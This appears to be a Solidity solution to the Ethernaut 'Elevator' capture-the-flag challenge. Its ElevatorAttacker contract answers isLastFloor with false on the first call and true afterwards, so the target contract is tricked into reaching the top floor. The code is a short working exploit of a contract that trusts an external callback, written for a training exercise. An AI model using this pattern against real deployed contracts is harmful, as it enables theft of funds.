// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator {
  function goTo(uint _floor) external;
}

// There is actually no need to inherit the contract from Building => 
// we could also simple define the "isLastFloor" method without the override keyword
contract ElevatorAttacker is Building { 
  IElevator challenge;
  uint numberOfTimesCalled = 0;

  constructor(address elevatorAddress) {
    challenge = IElevator(elevatorAddress);
  }

  function isLastFloor(uint) external override returns (bool) {
    numberOfTimesCalled+=1;

    if(numberOfTimesCalled>1)
      return true;
    else return false;
  }

  function attack() public {
    challenge.goTo(10);
  } 
}